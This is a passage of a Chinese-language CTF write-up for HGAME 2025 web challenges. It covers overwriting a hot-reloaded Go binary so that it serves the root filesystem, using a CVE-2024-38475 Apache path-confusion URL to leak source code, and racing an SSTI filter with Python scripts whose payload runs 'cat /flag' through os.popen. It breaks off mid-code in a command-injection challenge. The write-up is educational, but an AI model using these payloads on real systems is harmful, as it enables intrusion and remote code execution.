+</span></span><span class="line"><span class="ln">14</span><span class="cl">		<span class="nx">Endpoint</span><span class="p">:</span>  <span class="nx">conf</span><span class="p">.</span><span class="nx">MinioEndpoint</span><span class="p">,</span>
+</span></span><span class="line"><span class="ln">15</span><span class="cl">		<span class="nx">AccessKey</span><span class="p">:</span> <span class="nx">conf</span><span class="p">.</span><span class="nx">MinioAccessKey</span><span class="p">,</span>
+</span></span><span class="line"><span class="ln">16</span><span class="cl">		<span class="nx">SecretKey</span><span class="p">:</span> <span class="nx">conf</span><span class="p">.</span><span class="nx">MinioSecretKey</span><span class="p">,</span>
+</span></span><span class="line"><span class="ln">17</span><span class="cl">	<span class="p">}</span>
+</span></span><span class="line"><span class="ln">18</span><span class="cl">	<span class="nx">overseer</span><span class="p">.</span><span class="nf">Run</span><span class="p">(</span><span class="nx">overseer</span><span class="p">.</span><span class="nx">Config</span><span class="p">{</span>
+</span></span><span class="line"><span class="ln">19</span><span class="cl">		<span class="nx">Program</span><span class="p">:</span> <span class="nx">program</span><span class="p">,</span>
+</span></span><span class="line"><span class="ln">20</span><span class="cl">		<span class="nx">Fetcher</span><span class="p">:</span> <span class="nx">fetcher</span><span class="p">,</span>
+</span></span><span class="line"><span class="ln">21</span><span class="cl">	<span class="p">})</span>
+</span></span><span class="line"><span class="ln">22</span><span class="cl">
+</span></span><span class="line"><span class="ln">23</span><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="ln">24</span><span class="cl">
+</span></span><span class="line"><span class="ln">25</span><span class="cl"><span class="kd">func</span> <span class="nf">program</span><span class="p">(</span><span class="nx">state</span> <span class="nx">overseer</span><span class="p">.</span><span class="nx">State</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="ln">26</span><span class="cl">	<span class="nx">g</span> <span class="o">:=</span> <span class="nx">gin</span><span class="p">.</span><span class="nf">Default</span><span class="p">()</span>
+</span></span><span class="line"><span class="ln">27</span><span class="cl">	<span class="nx">g</span><span class="p">.</span><span class="nf">StaticFS</span><span class="p">(</span><span class="s">&#34;/&#34;</span><span class="p">,</span> <span class="nx">gin</span><span class="p">.</span><span class="nf">Dir</span><span class="p">(</span><span class="s">&#34;.&#34;</span><span class="p">,</span> <span class="kc">true</span><span class="p">))</span>
+</span></span><span class="line"><span class="ln">28</span><span class="cl">	<span class="nx">g</span><span class="p">.</span><span class="nf">Run</span><span class="p">(</span><span class="s">&#34;:8080&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="ln">29</span><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><p>我们可以猜测/路由展示的这个.目录就是前面我们下周main文件的目录</p>
+<p>我们可以把.改成根目录/，然后将编译后的源码覆写掉原来的update，热更新后，我们就能直接访问根目录了</p>
+<p>payload:</p>
+<pre tabindex="0"><code>package main
+
+import (
+	&#34;level25/fetch&#34;
+	&#34;level25/conf&#34;
+	&#34;github.com/gin-gonic/gin&#34;
+	&#34;github.com/jpillora/overseer&#34;
+)
+
+func main() {
+	fetcher := &amp;fetch.MinioFetcher{
+		Bucket:    conf.MinioBucket,
+		Key:       conf.MinioKey,
+		Endpoint:  conf.MinioEndpoint,
+		AccessKey: conf.MinioAccessKey,
+		SecretKey: conf.MinioSecretKey,
+	}
+	overseer.Run(overseer.Config{
+		Program: program,
+		Fetcher: fetcher,
+	})
+
+}
+
+func program(state overseer.State) {
+	g := gin.Default()
+	g.StaticFS(&#34;/abc&#34;, gin.Dir(&#34;/&#34;, true))
+	g.Run(&#34;:8080&#34;)
+}
+</code></pre><p>这里我将/路由改成了/abc，因为不知道为啥我用/路由不行</p>
+<p>将源码编译后覆写到储存桶上</p>
+<p><img alt="image-20250206163859652" loading="lazy" src="../assets/image-20250206163859652.png"></p>
+<p>访问/abc</p>
+<p><img alt="image-20250206164000985" loading="lazy" src="../assets/image-20250206164000985.png"></p>
+<p>拿到flag</p>
+<p><img alt="image-20250206164029974" loading="lazy" src="../assets/image-20250206164029974.png"></p>
+<h3 id="level-38475-角落">Level 38475 角落<a hidden class="anchor" aria-hidden="true" href="#level-38475-角落">#</a></h3>
+<p>ssti/条件竞争</p>
+<p><img alt="image-20250206164229496" loading="lazy" src="../assets/image-20250206164229496.png"></p>
+<p>/robots.txt有个/app.conf</p>
+<p><img alt="image-20250206164257706" loading="lazy" src="../assets/image-20250206164257706.png"></p>
+<p>访问/app.conf</p>
+<p><img alt="image-20250206164413970" loading="lazy" src="../assets/image-20250206164413970.png"></p>
+<p>这里展示了httpd.conf的片段</p>
+<p>这里给出了源码的位置还有一个重写引擎的规则，猜测应该是该版本的apache存在源码泄露</p>
+<p>同时在响应标头能找到Apache的版本信息</p>
+<p><img alt="image-20250206164739551" loading="lazy" src="../assets/image-20250206164739551.png"></p>
+<p>可以找到这个版本的apache存在源码泄露，而且是跟重写规则有关</p>
+<p>CVE-2024-38475</p>
+<p><img alt="image-20250206165000233" loading="lazy" src="../assets/image-20250206165000233.png"></p>
+<p>网上没找到什么poc</p>
+<p>但是可以找到漏洞发现者的一篇文章</p>
+<p><a href="https://blog.orange.tw/posts/2024-08-confusion-attacks-en/">https://blog.orange.tw/posts/2024-08-confusion-attacks-en/</a></p>
+<p><img alt="2dbfbdadba8694e40ae73db901c8c4e" loading="lazy" src="../assets/2dbfbdadba8694e40ae73db901c8c4e.jpg"></p>
+<p>根据这篇文章我们可以构造出paylaod</p>
+<pre tabindex="0"><code>http://node1.hgame.vidar.club:31155/admin/usr/local/apache2/app/app.py%3F
+</code></pre><p>这道题多了一个<strong>RewriteCond &ldquo;%{HTTP_USER_AGENT}&rdquo; &ldquo;^L1nk/&rdquo;</strong>，只需要在user-agent前面加上L1nk/即可</p>
+<p><img alt="image-20250206165543890" loading="lazy" src="../assets/image-20250206165543890.png"></p>
+<p>拿到源码</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="kn">from</span> <span class="nn">flask</span> <span class="kn">import</span> <span class="n">Flask</span><span class="p">,</span> <span class="n">request</span><span class="p">,</span> <span class="n">render_template</span><span class="p">,</span> <span class="n">render_template_string</span><span class="p">,</span> <span class="n">redirect</span>
+</span></span><span class="line"><span class="ln"> 2</span><span class="cl"><span class="kn">import</span> <span class="nn">os</span>
+</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="kn">import</span> <span class="nn">templates</span>
+</span></span><span class="line"><span class="ln"> 4</span><span class="cl">
+</span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="n">app</span> <span class="o">=</span> <span class="n">Flask</span><span class="p">(</span><span class="vm">__name__</span><span class="p">)</span>
+</span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="n">pwd</span> <span class="o">=</span> <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">dirname</span><span class="p">(</span><span class="vm">__file__</span><span class="p">)</span>
+</span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="n">show_msg</span> <span class="o">=</span> <span class="n">templates</span><span class="o">.</span><span class="n">show_msg</span>
+</span></span><span class="line"><span class="ln"> 8</span><span class="cl">
+</span></span><span class="line"><span class="ln"> 9</span><span class="cl">
+</span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="k">def</span> <span class="nf">readmsg</span><span class="p">():</span>
+</span></span><span class="line"><span class="ln">11</span><span class="cl">	<span class="n">filename</span> <span class="o">=</span> <span class="n">pwd</span> <span class="o">+</span> <span class="s2">&#34;/tmp/message.txt&#34;</span>
+</span></span><span class="line"><span class="ln">12</span><span class="cl">	<span class="k">if</span> <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">exists</span><span class="p">(</span><span class="n">filename</span><span class="p">):</span>
+</span></span><span class="line"><span class="ln">13</span><span class="cl">		<span class="n">f</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="n">filename</span><span class="p">,</span> <span class="s1">&#39;r&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="ln">14</span><span class="cl">		<span class="n">message</span> <span class="o">=</span> <span class="n">f</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
+</span></span><span class="line"><span class="ln">15</span><span class="cl">		<span class="n">f</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+</span></span><span class="line"><span class="ln">16</span><span class="cl">		<span class="k">return</span> <span class="n">message</span>
+</span></span><span class="line"><span class="ln">17</span><span class="cl">	<span class="k">else</span><span class="p">:</span>
+</span></span><span class="line"><span class="ln">18</span><span class="cl">		<span class="k">return</span> <span class="s1">&#39;No message now.&#39;</span>
+</span></span><span class="line"><span class="ln">19</span><span class="cl">
+</span></span><span class="line"><span class="ln">20</span><span class="cl">
+</span></span><span class="line"><span class="ln">21</span><span class="cl"><span class="nd">@app.route</span><span class="p">(</span><span class="s1">&#39;/index&#39;</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s1">&#39;GET&#39;</span><span class="p">])</span>
+</span></span><span class="line"><span class="ln">22</span><span class="cl"><span class="k">def</span> <span class="nf">index</span><span class="p">():</span>
+</span></span><span class="line"><span class="ln">23</span><span class="cl">	<span class="n">status</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;status&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="ln">24</span><span class="cl">	<span class="k">if</span> <span class="n">status</span> <span class="ow">is</span> <span class="kc">None</span><span class="p">:</span>
+</span></span><span class="line"><span class="ln">25</span><span class="cl">		<span class="n">status</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span>
+</span></span><span class="line"><span class="ln">26</span><span class="cl">	<span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s2">&#34;index.html&#34;</span><span class="p">,</span> <span class="n">status</span><span class="o">=</span><span class="n">status</span><span class="p">)</span>
+</span></span><span class="line"><span class="ln">27</span><span class="cl">
+</span></span><span class="line"><span class="ln">28</span><span class="cl">
+</span></span><span class="line"><span class="ln">29</span><span class="cl"><span class="nd">@app.route</span><span class="p">(</span><span class="s1">&#39;/send&#39;</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s1">&#39;POST&#39;</span><span class="p">])</span>
+</span></span><span class="line"><span class="ln">30</span><span class="cl"><span class="k">def</span> <span class="nf">write_message</span><span class="p">():</span>
+</span></span><span class="line"><span class="ln">31</span><span class="cl">	<span class="n">filename</span> <span class="o">=</span> <span class="n">pwd</span> <span class="o">+</span> <span class="s2">&#34;/tmp/message.txt&#34;</span>
+</span></span><span class="line"><span class="ln">32</span><span class="cl">	<span class="n">message</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">form</span><span class="p">[</span><span class="s1">&#39;message&#39;</span><span class="p">]</span>
+</span></span><span class="line"><span class="ln">33</span><span class="cl">
+</span></span><span class="line"><span class="ln">34</span><span class="cl">	<span class="n">f</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="n">filename</span><span class="p">,</span> <span class="s1">&#39;w&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="ln">35</span><span class="cl">	<span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">message</span><span class="p">)</span> 
+</span></span><span class="line"><span class="ln">36</span><span class="cl">	<span class="n">f</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+</span></span><span class="line"><span class="ln">37</span><span class="cl">
+</span></span><span class="line"><span class="ln">38</span><span class="cl">	<span class="k">return</span> <span class="n">redirect</span><span class="p">(</span><span class="s1">&#39;index?status=Send successfully!!&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="ln">39</span><span class="cl">	
+</span></span><span class="line"><span class="ln">40</span><span class="cl"><span class="nd">@app.route</span><span class="p">(</span><span class="s1">&#39;/read&#39;</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s1">&#39;GET&#39;</span><span class="p">])</span>
+</span></span><span class="line"><span class="ln">41</span><span class="cl"><span class="k">def</span> <span class="nf">read_message</span><span class="p">():</span>
+</span></span><span class="line"><span class="ln">42</span><span class="cl">	<span class="k">if</span> <span class="s2">&#34;{&#34;</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">readmsg</span><span class="p">():</span>
+</span></span><span class="line"><span class="ln">43</span><span class="cl">		<span class="n">show</span> <span class="o">=</span> <span class="n">show_msg</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s2">&#34;{{message}}&#34;</span><span class="p">,</span> <span class="n">readmsg</span><span class="p">())</span>
+</span></span><span class="line"><span class="ln">44</span><span class="cl">		<span class="k">return</span> <span class="n">render_template_string</span><span class="p">(</span><span class="n">show</span><span class="p">)</span>
+</span></span><span class="line"><span class="ln">45</span><span class="cl">	<span class="k">return</span> <span class="s1">&#39;waf!!&#39;</span>
+</span></span><span class="line"><span class="ln">46</span><span class="cl">	
+</span></span><span class="line"><span class="ln">47</span><span class="cl">
+</span></span><span class="line"><span class="ln">48</span><span class="cl"><span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s1">&#39;__main__&#39;</span><span class="p">:</span>
+</span></span><span class="line"><span class="ln">49</span><span class="cl">	<span class="n">app</span><span class="o">.</span><span class="n">run</span><span class="p">(</span><span class="n">host</span> <span class="o">=</span> <span class="s1">&#39;0.0.0.0&#39;</span><span class="p">,</span> <span class="n">port</span> <span class="o">=</span> <span class="mi">5000</span><span class="p">)</span>
+</span></span></code></pre></div><p>可以看到/read路由存在ssti，但是他waf掉了最重要的{</p>
+<p>但是可以看到这个/send路由会将传入的信息写入message.txt文件，在访问/read路由的时候则会读取message.txt文件。这么一来我们就可以考虑通过竞争的方式来绕过waf了。竞争思路大概就是我在很短的时间内连续发送两条信息，第一条信息是合法信息，而第二条信息是不合法的，那么就会存在一种情况，当第一条信息通过了判断，接下来要将文件的内容插入到模板中渲染的时候，刚好第二条不合法的信息覆写了message.txt，那么插入模板中的就是第二条不合法的信息了</p>
+<p>接下来就是搓脚本发包</p>
+<p>三个脚本</p>
+<p>poc1</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="ln">1</span><span class="cl"><span class="kn">import</span> <span class="nn">requests</span>
+</span></span><span class="line"><span class="ln">2</span><span class="cl"><span class="k">while</span> <span class="kc">True</span><span class="p">:</span>
+</span></span><span class="line"><span class="ln">3</span><span class="cl">    <span class="n">burp0_url</span> <span class="o">=</span> <span class="s2">&#34;http://node1.hgame.vidar.club:30762/app/send&#34;</span>
+</span></span><span class="line"><span class="ln">4</span><span class="cl">    <span class="n">burp0_headers</span> <span class="o">=</span> <span class="p">{</span><span class="s2">&#34;Cache-Control&#34;</span><span class="p">:</span> <span class="s2">&#34;max-age=0&#34;</span><span class="p">,</span> <span class="s2">&#34;Accept-Language&#34;</span><span class="p">:</span> <span class="s2">&#34;zh-CN,zh;q=0.9&#34;</span><span class="p">,</span> <span class="s2">&#34;Origin&#34;</span><span class="p">:</span> <span class="s2">&#34;http://node1.hgame.vidar.club:30762&#34;</span><span class="p">,</span> <span class="s2">&#34;Content-Type&#34;</span><span class="p">:</span> <span class="s2">&#34;application/x-www-form-urlencoded&#34;</span><span class="p">,</span> <span class="s2">&#34;Upgrade-Insecure-Requests&#34;</span><span class="p">:</span> <span class="s2">&#34;1&#34;</span><span class="p">,</span> <span class="s2">&#34;User-Agent&#34;</span><span class="p">:</span> <span class="s2">&#34;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.6723.70 Safari/537.36&#34;</span><span class="p">,</span> <span class="s2">&#34;Accept&#34;</span><span class="p">:</span> <span class="s2">&#34;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7&#34;</span><span class="p">,</span> <span class="s2">&#34;Referer&#34;</span><span class="p">:</span> <span class="s2">&#34;http://node1.hgame.vidar.club:30762/app/index&#34;</span><span class="p">,</span> <span class="s2">&#34;Accept-Encoding&#34;</span><span class="p">:</span> <span class="s2">&#34;gzip, deflate, br&#34;</span><span class="p">,</span> <span class="s2">&#34;Connection&#34;</span><span class="p">:</span> <span class="s2">&#34;keep-alive&#34;</span><span class="p">}</span>
+</span></span><span class="line"><span class="ln">5</span><span class="cl">    <span class="n">burp0_data</span> <span class="o">=</span> <span class="p">{</span><span class="s2">&#34;message&#34;</span><span class="p">:</span> <span class="s2">&#34;{{config.__class__.__init__.__globals__[&#39;os&#39;].popen(&#39;cat /flag&#39;).read()}}&#34;</span><span class="p">}</span>
+</span></span><span class="line"><span class="ln">6</span><span class="cl">    <span class="n">res</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">burp0_url</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">burp0_headers</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">burp0_data</span><span class="p">)</span>
+</span></span><span class="line"><span class="ln">7</span><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="n">res</span><span class="o">.</span><span class="n">status_code</span><span class="p">)</span>
+</span></span><span class="line"><span class="ln">8</span><span class="cl">    
+</span></span></code></pre></div><p>poc2</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="ln">1</span><span class="cl"><span class="kn">import</span> <span class="nn">requests</span>
+</span></span><span class="line"><span class="ln">2</span><span class="cl"><span class="k">while</span> <span class="kc">True</span><span class="p">:</span>
+</span></span><span class="line"><span class="ln">3</span><span class="cl">    <span class="n">burp0_url</span> <span class="o">=</span> <span class="s2">&#34;http://node1.hgame.vidar.club:30762/app/send&#34;</span>
+</span></span><span class="line"><span class="ln">4</span><span class="cl">    <span class="n">burp0_headers</span> <span class="o">=</span> <span class="p">{</span><span class="s2">&#34;Cache-Control&#34;</span><span class="p">:</span> <span class="s2">&#34;max-age=0&#34;</span><span class="p">,</span> <span class="s2">&#34;Accept-Language&#34;</span><span class="p">:</span> <span class="s2">&#34;zh-CN,zh;q=0.9&#34;</span><span class="p">,</span> <span class="s2">&#34;Origin&#34;</span><span class="p">:</span> <span class="s2">&#34;http://node1.hgame.vidar.club:30762&#34;</span><span class="p">,</span> <span class="s2">&#34;Content-Type&#34;</span><span class="p">:</span> <span class="s2">&#34;application/x-www-form-urlencoded&#34;</span><span class="p">,</span> <span class="s2">&#34;Upgrade-Insecure-Requests&#34;</span><span class="p">:</span> <span class="s2">&#34;1&#34;</span><span class="p">,</span> <span class="s2">&#34;User-Agent&#34;</span><span class="p">:</span> <span class="s2">&#34;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.6723.70 Safari/537.36&#34;</span><span class="p">,</span> <span class="s2">&#34;Accept&#34;</span><span class="p">:</span> <span class="s2">&#34;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7&#34;</span><span class="p">,</span> <span class="s2">&#34;Referer&#34;</span><span class="p">:</span> <span class="s2">&#34;http://node1.hgame.vidar.club:30762/app/index&#34;</span><span class="p">,</span> <span class="s2">&#34;Accept-Encoding&#34;</span><span class="p">:</span> <span class="s2">&#34;gzip, deflate, br&#34;</span><span class="p">,</span> <span class="s2">&#34;Connection&#34;</span><span class="p">:</span> <span class="s2">&#34;keep-alive&#34;</span><span class="p">}</span>
+</span></span><span class="line"><span class="ln">5</span><span class="cl">    <span class="n">burp0_data</span> <span class="o">=</span> <span class="p">{</span><span class="s2">&#34;message&#34;</span><span class="p">:</span> <span class="s2">&#34;123&#34;</span><span class="p">}</span>
+</span></span><span class="line"><span class="ln">6</span><span class="cl">    <span class="n">res</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">burp0_url</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">burp0_headers</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">burp0_data</span><span class="p">)</span>
+</span></span><span class="line"><span class="ln">7</span><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="n">res</span><span class="o">.</span><span class="n">status_code</span><span class="p">)</span>
+</span></span></code></pre></div><p>poc3</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="ln">1</span><span class="cl"><span class="kn">import</span> <span class="nn">requests</span>
+</span></span><span class="line"><span class="ln">2</span><span class="cl"><span class="k">while</span> <span class="kc">True</span><span class="p">:</span>
+</span></span><span class="line"><span class="ln">3</span><span class="cl">    <span class="n">burp0_url</span> <span class="o">=</span> <span class="s2">&#34;http://node1.hgame.vidar.club:30762/app/read&#34;</span>
+</span></span><span class="line"><span class="ln">4</span><span class="cl">    <span class="n">burp0_headers</span> <span class="o">=</span> <span class="p">{</span><span class="s2">&#34;Accept-Language&#34;</span><span class="p">:</span> <span class="s2">&#34;zh-CN,zh;q=0.9&#34;</span><span class="p">,</span> <span class="s2">&#34;Upgrade-Insecure-Requests&#34;</span><span class="p">:</span> <span class="s2">&#34;1&#34;</span><span class="p">,</span> <span class="s2">&#34;User-Agent&#34;</span><span class="p">:</span> <span class="s2">&#34;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.6723.70 Safari/537.36&#34;</span><span class="p">,</span> <span class="s2">&#34;Accept&#34;</span><span class="p">:</span> <span class="s2">&#34;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7&#34;</span><span class="p">,</span> <span class="s2">&#34;Accept-Encoding&#34;</span><span class="p">:</span> <span class="s2">&#34;gzip, deflate, br&#34;</span><span class="p">,</span> <span class="s2">&#34;Connection&#34;</span><span class="p">:</span> <span class="s2">&#34;keep-alive&#34;</span><span class="p">}</span>
+</span></span><span class="line"><span class="ln">5</span><span class="cl">    <span class="n">res</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">burp0_url</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">burp0_headers</span><span class="p">)</span>
+</span></span><span class="line"><span class="ln">6</span><span class="cl">    <span class="c1"># print(res.text)</span>
+</span></span><span class="line"><span class="ln">7</span><span class="cl">    <span class="k">if</span> <span class="s2">&#34;hgame&#34;</span> <span class="ow">in</span> <span class="p">(</span><span class="n">res</span><span class="o">.</span><span class="n">text</span><span class="p">):</span>
+</span></span><span class="line"><span class="ln">8</span><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="n">res</span><span class="o">.</span><span class="n">text</span><span class="p">)</span>
+</span></span><span class="line"><span class="ln">9</span><span class="cl">        <span class="k">break</span>
+</span></span></code></pre></div><p>成功执行，拿到flag</p>
+<p><img alt="ce7c9af5b1c85c5b5c60632c51b313a" loading="lazy" src="../assets/ce7c9af5b1c85c5b5c60632c51b313a.png"></p>
+<h3 id="week2">week2<a hidden class="anchor" aria-hidden="true" href="#week2">#</a></h3>
+<p>week2强度有点高，就打了一道HoneyPot，复现一手</p>
+<h3 id="level-21096-honeypot"><strong>Level 21096 HoneyPot</strong><a hidden class="anchor" aria-hidden="true" href="#level-21096-honeypot">#</a></h3>
+<p>应该是非预期</p>
+<p>可以找到这个函数，也就是/api/import，可以进行命令拼接</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-Dockerfile" data-lang="Dockerfile"><span class="line"><span class="ln"> 1</span><span class="cl">func ImportData<span class="o">(</span>c *gin.Context<span class="o">)</span> <span class="o">{</span><span class="err">
+</span></span></span><span class="line"><span class="ln"> 2</span><span class="cl"><span class="err"></span>    var config ImportConfig<span class="err">
+</span></span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="err"></span>    <span class="k">if</span> err :<span class="o">=</span> c.ShouldBindJSON<span class="o">(</span><span class="p">&amp;</span>config<span class="o">)</span><span class="p">;</span> err !<span class="o">=</span> nil <span class="o">{</span><span class="err">
+</span></span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="err"></span>        c.JSON<span class="o">(</span>http.StatusBadRequest, gin.H<span class="o">{</span><span class="err">
+</span></span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="err"></span>            <span class="s2">&#34;success&#34;</span>: false,<span class="err">
+</span></span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="err"></span>            <span class="s2">&#34;message&#34;</span>: <span class="s2">&#34;Invalid request body: &#34;</span> + err.Error<span class="o">()</span>,<span class="err">
+</span></span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="err"></span>        <span class="o">})</span><span class="err">
+</span></span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="err"></span>        <span class="k">return</span><span class="err">
+</span></span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="err"></span>    <span class="o">}</span><span class="err">
+</span></span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="err"></span>    <span class="k">if</span> err :<span class="o">=</span> validateImportConfig<span class="o">(</span>config<span class="o">)</span><span class="p">;</span> err !<span class="o">=</span> nil <span class="o">{</span><span class="err">
+</span></span></span><span class="line"><span class="ln">11</span><span class="cl"><span class="err"></span>        c.JSON<span class="o">(</span>http.StatusBadRequest, gin.H<span class="o">{</span><span class="err">
+</span></span></span><span class="line"><span class="ln">12</span><span class="cl"><span class="err"></span>            <span class="s2">&#34;success&#34;</span>: false,<span class="err">
+</span></span></span><span class="line"><span class="ln">13</span><span class="cl"><span class="err"></span>            <span class="s2">&#34;message&#34;</span>: <span class="s2">&#34;Invalid input: &#34;</span> + err.Error<span class="o">()</span>,<span class="err">
+</span></span></span><span class="line"><span class="ln">14</span><span class="cl"><span class="err"></span>        <span class="o">})</span><span class="err">
+</span></span></span><span class="line"><span class="ln">15</span><span class="cl"><span class="err"></span>        <span class="k">return</span><span class="err">
+</span></span></span><span class="line"><span class="ln">16</span><span class="cl"><span class="err"></span>    <span class="o">}</span><span class="err">
+</span></span></span><span class="line"><span class="ln">17</span><span class="cl"><span class="err">
+</span></span></span><span class="line"><span class="ln">18</span><span class="cl"><span class="err"></span>    config.RemoteHost <span class="o">=</span> sanitizeInput<span class="o">(</span>config.RemoteHost<span class="o">)</span><span class="err">
+</span></span></span><span class="line"><span class="ln">19</span><span class="cl"><span class="err"></span>    config.RemoteUsername <span class="o">=</span> sanitizeInput<span class="o">(</span>config.RemoteUsername<span class="o">)</span><span class="err">
+</span></span></span><span class="line"><span class="ln">20</span><span class="cl"><span class="err"></span>    config.RemoteDatabase <span class="o">=</span> sanitizeInput<span class="o">(</span>config.RemoteDatabase<span class="o">)</span><span class="err">
+</span></span></span><span class="line"><span class="ln">21</span><span class="cl"><span class="err"></span>    config.LocalDatabase <span class="o">=</span> sanitizeInput<span class="o">(</span>config.LocalDatabase<span class="o">)</span><span class="err">
+</span></span></span><span class="line"><span class="ln">22</span><span class="cl"><span class="err"></span>    <span class="k">if</span> manager.db <span class="o">==</span> nil <span class="o">{</span><span class="err">
+</span></span></span><span class="line"><span class="ln">23</span><span class="cl"><span class="err"></span>        dsn :<span class="o">=</span> buildDSN<span class="o">(</span>localConfig<span class="o">)</span><span class="err">
+</span></span></span><span class="line"><span class="ln">24</span><span class="cl"><span class="err"></span>        db, err :<span class="o">=</span> sql.Open<span class="o">(</span><span class="s2">&#34;mysql&#34;</span>, dsn<span class="o">)</span><span class="err">
+</span></span></span><span class="line"><span class="ln">25</span><span class="cl"><span class="err"></span>        <span class="k">if</span> err !<span class="o">=</span> nil <span class="o">{</span><span class="err">
+</span></span></span><span class="line"><span class="ln">26</span><span class="cl"><span class="err"></span>            c.JSON<span class="o">(</span>http.StatusInternalServerError, gin.H<span class="o">{</span><span class="err">
+</span></span></span><span class="line"><span class="ln">27</span><span class="cl"><span class="err"></span>                <span class="s2">&#34;success&#34;</span>: false,<span class="err">
+</span></span></span><span class="line"><span class="ln">28</span><span class="cl"><span class="err"></span>                <span class="s2">&#34;message&#34;</span>: <span class="s2">&#34;Failed to connect to local database: &#34;</span> + err.Error<span class="o">()</span>,<span class="err">
+</span></span></span><span class="line"><span class="ln">29</span><span class="cl"><span class="err"></span>            <span class="o">})</span><span class="err">
+</span></span></span><span class="line"><span class="ln">30</span><span class="cl"><span class="err"></span>            <span class="k">return</span><span class="err">
+</span></span></span><span class="line"><span class="ln">31</span><span class="cl"><span class="err"></span>        <span class="o">}</span><span class="err">
+</span></span></span><span class="line"><span class="ln">32</span><span class="cl"><span class="err">
+</span></span></span><span class="line"><span class="ln">33</span><span class="cl"><span class="err"></span>        <span class="k">if</span> err :<span class="o">=</span> db.Ping<span class="o">()</span><span class="p">;</span> err !<span class="o">=</span> nil <span class="o">{</span><span class="err">
+</span></span></span><span class="line"><span class="ln">34</span><span class="cl"><span class="err"></span>            db.Close<span class="o">()</span><span class="err">
+</span></span></span><span class="line"><span class="ln">35</span><span class="cl"><span class="err"></span>            c.JSON<span class="o">(</span>http.StatusInternalServerError, gin.H<span class="o">{</span><span class="err">
+</span></span></span><span class="line"><span class="ln">36</span><span class="cl"><span class="err"></span>                <span class="s2">&#34;success&#34;</span>: false,<span class="err">
+</span></span></span><span class="line"><span class="ln">37</span><span class="cl"><span class="err"></span>                <span class="s2">&#34;message&#34;</span>: <span class="s2">&#34;Failed to ping local database: &#34;</span> + err.Error<span class="o">()</span>,<span class="err">
